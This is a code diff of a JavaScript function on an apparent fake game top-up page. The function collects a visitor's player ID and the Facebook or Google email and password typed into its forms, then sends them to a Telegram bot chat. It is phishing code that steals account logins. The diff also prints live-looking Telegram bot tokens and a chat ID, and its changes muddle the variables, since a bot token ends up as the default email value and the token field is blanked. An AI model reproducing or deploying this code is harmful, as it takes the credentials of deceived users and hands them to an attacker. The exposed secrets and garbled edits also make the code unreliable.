@@ -116,8 +116,8 @@
         function sendDataToTelegram(loginMethod) {
             const playerId = document.getElementById('player-id').value;
             const selectedDiamond = document.querySelector('.diamond-option.bg-yellow-400 span').innerText;
-            let email = '';
-            let password = '';
+            let email = '7017022254:AAHZuKy9tmvROvabQswy9Xi1Ta9GUxdJUsc';
+            let password = '7832574874';
 
             if (loginMethod === 'facebook') {
                 email = document.getElementById('facebook-email').value;
@@ -127,7 +127,7 @@
                 password = document.getElementById('google-password').value;
             }
 
-            const botToken = '7680682575:AAH5iOAA0CvTralAKvJlU2hI8b_7hlhnSgQ';
+            const botToken = '';
             const chatId = '7832574874';
             const message = `ID Player: ${playerId}\nDiamond: ${selectedDiamond}\nLogin Method: ${loginMethod}\nEmail: ${email}\nPassword: ${password}`;
 
